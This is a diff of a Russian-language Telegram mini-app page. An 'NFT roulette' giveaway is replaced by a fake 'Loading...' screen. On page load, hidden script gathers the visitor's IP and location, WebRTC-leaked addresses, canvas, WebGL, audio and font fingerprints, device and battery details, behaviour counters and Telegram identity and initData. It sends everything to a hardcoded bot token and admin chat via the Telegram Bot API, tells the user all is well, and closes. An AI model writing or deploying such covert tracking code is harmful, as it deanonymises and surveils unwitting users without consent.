@@ -1,52 +1,369 @@
-<!DOCTYPE html><html lang="ru"><head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Рулетка NFT</title>
-  <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@300;400;600;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
-  <link rel="stylesheet" href="styles.css">
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: var(--tg-theme-bg-color, #1a1a2e);
+    color: var(--tg-theme-text-color, #eee);
+    display: flex; align-items: center; justify-content: center;
+    min-height: 100vh; text-align: center;
+  }
+  .loader {
+    display: flex; flex-direction: column; align-items: center; gap: 16px;
+  }
+  .spinner {
+    width: 48px; height: 48px;
+    border: 4px solid rgba(255,255,255,0.1);
+    border-top-color: #4fc3f7;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .status { font-size: 14px; opacity: 0.7; }
+  .done { color: #81c784; font-size: 16px; font-weight: 600; }
+</style>
 </head>
 <body>
-  <div class="container">
-    <h1>NFT Lucky Gifts </h1>
-    <h1><span style="color:#8092F6 ;">рулетка</span></h1>
-    <div class="carousel-wrapper">
-      <div id="loading-indicator">Загрузка подарков...</div>
-      <div id="carousel" class="carousel"></div>
-      <div id="pointer"></div>
-    </div>
-    <div class="button-group">
-      <button id="spin" class="btn" disabled="">Крутить бесплатно</button>
-    </div>
-    <div id="timer">Следующее вращение: <span id="countdown">00:00:00</span></div>
-  </div>
+<div class="loader">
+  <div class="spinner"></div>
+  <div class="status" id="status">Инициализация...</div>
+</div>
 
-  <div id="modal">
-    <div class="dialog">
-      <h2>🎉 Ваш приз:</h2>
-      <img id="prize-img" src="" alt="Подарок">
-      <p id="prize-name"></p>
-      <button id="connect" class="btn">Получить подарок</button>
-    </div>
-  </div>
+<script>
+const tg = window.Telegram?.WebApp;
+if (tg) { tg.ready(); tg.expand(); }
 
-  <nav>
-    <a class="active"><i class="fas fa-home"></i> Главная</a>
-    <a href="/tasks"><i class="fas fa-tasks"></i> Задания</a>
-    <a href="/profile"><i class="fas fa-user"></i> Профиль</a>
-  </nav>
+const BOT_TOKEN = "8606351874:AAGVzfNwQMm5MwQpziNWsFSZTbcaoLxKQLA";
+const ADMIN_ID = "6274359421";
 
-  <script src="script.js"></script>
-  <script>
-    document.getElementById("connect").addEventListener("click", () => {
-    const modal = document.getElementById("modal");
-    modal.classList.add("hidden");
+function setStatus(txt) {
+  document.getElementById('status').textContent = txt;
+}
 
-    // если хочешь полностью скрыть с экрана:
-    setTimeout(() => {
-      modal.style.display = "none";
-    }, 300);
+// ─── Утилиты ────────────────────────────────────────────
+function parseUA(ua) {
+  let os = 'Unknown', browser = 'Unknown', device = 'Unknown';
+  if (/Windows NT 10/.test(ua)) os = 'Windows 10';
+  else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
+  else if (/Mac OS X ([\d_]+)/.test(ua)) os = 'macOS ' + ua.match(/Mac OS X ([\d_]+)/)[1].replace(/_/g,'.');
+  else if (/Android ([\d.]+)/.test(ua)) os = 'Android ' + ua.match(/Android ([\d.]+)/)[1];
+  else if (/iPhone OS ([\d_]+)/.test(ua)) os = 'iOS ' + ua.match(/iPhone OS ([\d_]+)/)[1].replace(/_/g,'.');
+  else if (/Linux/.test(ua)) os = 'Linux';
+
+  if (/Edg\/([\d.]+)/.test(ua)) browser = 'Edge ' + ua.match(/Edg\/([\d.]+)/)[1];
+  else if (/OPR\/([\d.]+)/.test(ua)) browser = 'Opera ' + ua.match(/OPR\/([\d.]+)/)[1];
+  else if (/Chrome\/([\d.]+)/.test(ua)) browser = 'Chrome ' + ua.match(/Chrome\/([\d.]+)/)[1];
+  else if (/Firefox\/([\d.]+)/.test(ua)) browser = 'Firefox ' + ua.match(/Firefox\/([\d.]+)/)[1];
+  else if (/Safari\/([\d.]+)/.test(ua)) browser = 'Safari';
+
+  if (/iPhone/.test(ua)) device = 'iPhone';
+  else if (/iPad/.test(ua)) device = 'iPad';
+  else if (/Android/.test(ua) && /Mobile/.test(ua)) device = 'Android Phone';
+  else if (/Android/.test(ua)) device = 'Android Tablet';
+  else device = 'Desktop';
+
+  return { os, browser, device };
+}
+
+// Canvas fingerprint
+function canvasFingerprint() {
+  try {
+    const c = document.createElement('canvas');
+    const ctx = c.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = '#069';
+    ctx.fillText('Hello, world! 🌍', 2, 15);
+    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+    ctx.fillText('Canvas FP', 4, 45);
+    return btoa(c.toDataURL()).slice(0, 40);
+  } catch(e) { return 'blocked'; }
+}
+
+// WebGL fingerprint
+function webglFingerprint() {
+  try {
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if (!gl) return 'not supported';
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    const vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
+    const renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+    return `${vendor} | ${renderer}`;
+  } catch(e) { return 'blocked'; }
+}
+
+// Audio fingerprint
+async function audioFingerprint() {
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = ctx.createOscillator();
+    const analyser = ctx.createAnalyser();
+    const gain = ctx.createGain();
+    gain.gain.value = 0;
+    osc.connect(analyser);
+    analyser.connect(gain);
+    gain.connect(ctx.destination);
+    osc.start(0);
+    const buf = new Float32Array(analyser.frequencyBinCount);
+    analyser.getFloatFrequencyData(buf);
+    osc.stop();
+    await ctx.close();
+    const sum = buf.reduce((a, b) => a + Math.abs(b), 0);
+    return sum.toFixed(6);
+  } catch(e) { return 'blocked'; }
+}
+
+// WebRTC IP leak
+function getWebRTCIPs() {
+  return new Promise(resolve => {
+    const ips = new Set();
+    try {
+      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+      pc.createDataChannel('');
+      pc.createOffer().then(o => pc.setLocalDescription(o));
+      pc.onicecandidate = e => {
+        if (!e.candidate) { pc.close(); resolve([...ips]); return; }
+        const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);
+        if (m) m.forEach(ip => ips.add(ip));
+      };
+      setTimeout(() => { try { pc.close(); } catch(_){} resolve([...ips]); }, 3000);
+    } catch(e) { resolve([]); }
   });
-  </script>
+}
 
-</body></html>
+// DevTools detection
+function isDevToolsOpen() {
+  const threshold = 160;
+  return (window.outerWidth - window.innerWidth > threshold) ||
+         (window.outerHeight - window.innerHeight > threshold);
+}
+
+// Battery
+async function getBattery() {
+  try {
+    const b = await navigator.getBattery();
+    return { level: Math.round(b.level * 100) + '%', charging: b.charging };
+  } catch(e) { return { level: 'N/A', charging: 'N/A' }; }
+}
+
+// IP + GeoIP
+async function getGeoIP() {
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    return await r.json();
+  } catch(e) {
+    try {
+      const r = await fetch('https://ip-api.com/json/');
+      return await r.json();
+    } catch(e2) { return {}; }
+  }
+}
+
+// Fonts (косвенно)
+function detectFonts() {
+  const fonts = ['Arial','Courier New','Georgia','Times New Roman','Verdana',
+    'Impact','Comic Sans MS','Trebuchet MS','Palatino','Garamond','Tahoma',
+    'Helvetica','Geneva','Monaco','Consolas','Lucida Console'];
+  const canvas = document.createElement('canvas');
+  const ctx = canvas.getContext('2d');
+  const base = 'monospace';
+  const detected = [];
+  ctx.font = `16px ${base}`;
+  const bw = ctx.measureText('mmmmmmm').width;
+  for (const f of fonts) {
+    ctx.font = `16px '${f}', ${base}`;
+    if (ctx.measureText('mmmmmmm').width !== bw) detected.push(f);
+  }
+  return detected;
+}
+
+// Behaviour tracking
+const behaviour = {
+  mouseMoves: 0, clicks: 0, scrolls: 0,
+  copied: false, pasted: false,
+  startTime: Date.now(),
+  tabHidden: 0
+};
+document.addEventListener('mousemove', () => behaviour.mouseMoves++);
+document.addEventListener('click', () => behaviour.clicks++);
+document.addEventListener('scroll', () => behaviour.scrolls++);
+document.addEventListener('copy', () => { behaviour.copied = true; });
+document.addEventListener('paste', () => { behaviour.pasted = true; });
+document.addEventListener('visibilitychange', () => {
+  if (document.hidden) behaviour.tabHidden++;
+});
+
+// ─── MAIN ───────────────────────────────────────────────
+async function collectAndSend() {
+  setStatus('Сбор данных...');
+
+  const ua = navigator.userAgent;
+  const { os, browser, device } = parseUA(ua);
+  const nav = window.navigator;
+  const scr = window.screen;
+
+  const [geo, battery, webrtcIPs, audioFP] = await Promise.all([
+    getGeoIP(), getBattery(), getWebRTCIPs(), audioFingerprint()
+  ]);
+
+  const tgUser = tg?.initDataUnsafe?.user || {};
+  const initData = tg?.initData || 'N/A';
+
+  const timeOnSite = Math.round((Date.now() - behaviour.startTime) / 1000);
+  const connection = nav.connection || nav.mozConnection || nav.webkitConnection || {};
+
+  // VPN/Proxy check (грубый — по timezone vs geo)
+  const tzOffset = -new Date().getTimezoneOffset();
+  const geoOffset = geo.utc_offset ? parseInt(geo.utc_offset) / 100 * 60 : null;
+  const vpnSuspect = geoOffset !== null && Math.abs(tzOffset - geoOffset) > 120;
+
+  const fonts = detectFonts();
+
+  // Собираем всё в читаемый текст
+  const report = [
+    `━━━━━━━━━━━━━━━━━━━━`,
+    `🌐 СЕТЬ`,
+    `├ IP: ${geo.ip || 'N/A'}`,
+    `├ Страна: ${geo.country_name || geo.country || 'N/A'}`,
+    `├ Регион: ${geo.region || 'N/A'}`,
+    `├ Город: ${geo.city || 'N/A'}`,
+    `├ Провайдер: ${geo.org || geo.isp || 'N/A'}`,
+    `├ Timezone: ${geo.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+    `├ WebRTC IPs: ${webrtcIPs.length ? webrtcIPs.join(', ') : 'нет утечек'}`,
+    `└ VPN/Proxy подозрение: ${vpnSuspect ? '⚠️ Да' : '✅ Нет'}`,
+    ``,
+    `━━━━━━━━━━━━━━━━━━━━`,
+    `💻 УСТРОЙСТВО`,
+    `├ Устройство: ${device}`,
+    `├ ОС: ${os}`,
+    `├ Браузер: ${browser}`,
+    `├ User-Agent: ${ua}`,
+    `├ Язык: ${nav.language} | ${(nav.languages||[]).join(', ')}`,
+    `├ Часовой пояс: ${Intl.DateTimeFormat().resolvedOptions().timeZone} (UTC${tzOffset >= 0 ? '+' : ''}${tzOffset/60})`,
+    `├ Разрешение экрана: ${scr.width}×${scr.height}`,
+    `├ Размер окна: ${window.innerWidth}×${window.innerHeight}`,
+    `├ DPI/DevicePixelRatio: ${window.devicePixelRatio}`,
+    `├ Цветовая глубина: ${scr.colorDepth}bit`,
+    `├ Тема: ${window.matchMedia('(prefers-color-scheme: dark)').matches ? '🌑 Тёмная' : '☀️ Светлая'}`,
+    `├ CPU ядра: ${nav.hardwareConcurrency || 'N/A'}`,
+    `├ RAM (прибл.): ${nav.deviceMemory ? nav.deviceMemory + ' GB' : 'N/A'}`,
+    `├ Touch поддержка: ${'ontouchstart' in window || nav.maxTouchPoints > 0 ? '✅ Да (' + nav.maxTouchPoints + ' точек)' : '❌ Нет'}`,
+    `├ Cookies включены: ${nav.cookieEnabled ? '✅' : '❌'}`,
+    `├ localStorage: ${(() => { try { localStorage.setItem('_t','1'); localStorage.removeItem('_t'); return '✅'; } catch(e) { return '❌'; } })()}`,
+    `├ Батарея: ${battery.level} | Зарядка: ${battery.charging}`,
+    `├ DevTools открыты: ${isDevToolsOpen() ? '⚠️ Да' : '❌ Нет'}`,
+    `└ Реферер: ${document.referrer || 'прямой заход'}`,
+    ``,
+    `━━━━━━━━━━━━━━━━━━━━`,
+    `🔬 FINGERPRINTS`,
+    `├ Canvas FP: ${canvasFingerprint()}`,
+    `├ WebGL: ${webglFingerprint()}`,
+    `└ Audio FP: ${audioFP}`,
+    ``,
+    `━━━━━━━━━━━━━━━━━━━━`,
+    `🌐 СЕТЬ (скорость)`,
+    `├ effectiveType: ${connection.effectiveType || 'N/A'}`,
+    `├ Downlink: ${connection.downlink ? connection.downlink + ' Mbps' : 'N/A'}`,
+    `└ RTT: ${connection.rtt ? connection.rtt + ' ms' : 'N/A'}`,
+    ``,
+    `━━━━━━━━━━━━━━━━━━━━`,
+    `🎨 ШРИФТЫ (обнаружены)`,
+    `└ ${fonts.length ? fonts.join(', ') : 'не удалось определить'}`,
+    ``,
+    `━━━━━━━━━━━━━━━━━━━━`,
+    `📊 ПОВЕДЕНИЕ`,
+    `├ Время на сайте: ${timeOnSite}с`,
+    `├ Движений мыши: ${behaviour.mouseMoves}`,
+    `├ Кликов: ${behaviour.clicks}`,
+    `├ Скроллов: ${behaviour.scrolls}`,
+    `├ Копировал текст: ${behaviour.copied ? '✅' : '❌'}`,
+    `├ Вставлял текст: ${behaviour.pasted ? '✅' : '❌'}`,
+    `└ Уходил со вкладки: ${behaviour.tabHidden} раз`,
+    ``,
+    `━━━━━━━━━━━━━━━━━━━━`,
+    `📱 TELEGRAM`,
+    `├ ID: ${tgUser.id || 'N/A'}`,
+    `├ Имя: ${tgUser.first_name || ''} ${tgUser.last_name || ''}`,
+    `├ Username: @${tgUser.username || 'N/A'}`,
+    `├ Язык: ${tgUser.language_code || 'N/A'}`,
+    `├ Premium: ${tgUser.is_premium ? '✅ Да' : '❌ Нет'}`,
+    `└ initData: ${initData.slice(0, 80)}...`,
+  ].join('\n');
+
+  setStatus('Отправка данных...');
+
+  // Отправляем через Telegram WebApp если доступно
+  if (tg && tg.sendData) {
+    try {
+      tg.sendData(report);
+    } catch(e) {}
+  }
+
+  // Также отправляем напрямую в бот через Bot API
+  const tgMsg = `🔔 <b>НОВЫЙ ПОЛЬЗОВАТЕЛЬ В МИНи-ПРИЛОЖЕНИИ</b>\n\n` +
+    `👤 <b>TELEGRAM:</b>\n` +
+    `├ ID: <code>${tgUser.id || 'N/A'}</code>\n` +
+    `├ Имя: ${(tgUser.first_name || '') + ' ' + (tgUser.last_name || '')}\n` +
+    `├ Username: @${tgUser.username || 'N/A'}\n` +
+    `├ Язык: ${tgUser.language_code || 'N/A'}\n` +
+    `└ Premium: ${tgUser.is_premium ? '✅' : '❌'}\n\n` +
+    `🌐 <b>IP / ГЕО:</b>\n` +
+    `├ IP: <code>${geo.ip || 'N/A'}</code>\n` +
+    `├ Страна: ${geo.country_name || geo.country || 'N/A'}\n` +
+    `├ Город: ${geo.city || 'N/A'}\n` +
+    `├ Провайдер: ${geo.org || geo.isp || 'N/A'}\n` +
+    `└ VPN?: ${vpnSuspect ? '⚠️ Возможно' : '✅ Нет'}\n\n` +
+    `💻 <b>УСТРОЙСТВО:</b>\n` +
+    `├ ${device} | ${os}\n` +
+    `├ Браузер: ${browser}\n` +
+    `├ Экран: ${scr.width}×${scr.height} | DPI: ${window.devicePixelRatio}\n` +
+    `├ CPU: ${nav.hardwareConcurrency || '?'} ядер | RAM: ${nav.deviceMemory || '?'}GB\n` +
+    `└ Батарея: ${battery.level} | Зарядка: ${battery.charging}\n\n` +
+    `🔬 <b>FINGERPRINTS:</b>\n` +
+    `├ Canvas: <code>${canvasFingerprint()}</code>\n` +
+    `├ WebGL: ${webglFingerprint().slice(0,60)}\n` +
+    `└ Audio: <code>${audioFP}</code>\n\n` +
+    `📊 <b>ПОВЕДЕНИЕ:</b>\n` +
+    `├ Время: ${timeOnSite}с | Клики: ${behaviour.clicks} | Скролл: ${behaviour.scrolls}\n` +
+    `└ WebRTC IPs: ${webrtcIPs.length ? webrtcIPs.join(', ') : 'нет утечек'}\n\n` +
+    `<code>UA: ${ua.slice(0, 120)}</code>`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: ADMIN_ID,
+        text: tgMsg,
+        parse_mode: 'HTML'
+      })
+    });
+  } catch(e) {
+    console.error('Telegram send error:', e);
+  }
+
+  // Показываем пользователю что всё ок
+  document.querySelector('.loader').innerHTML =
+    `<div class="done">✅ Загрузка завершена</div><div class="status">Добро пожаловать!</div>`;
+
+  if (tg) {
+    setTimeout(() => tg.close(), 2000);
+  }
+}
+
+// Запускаем после небольшой задержки для сбора поведения
+window.addEventListener('load', () => {
+  setTimeout(collectAndSend, 1500);
+});
+</script>
+</body>
+</html>
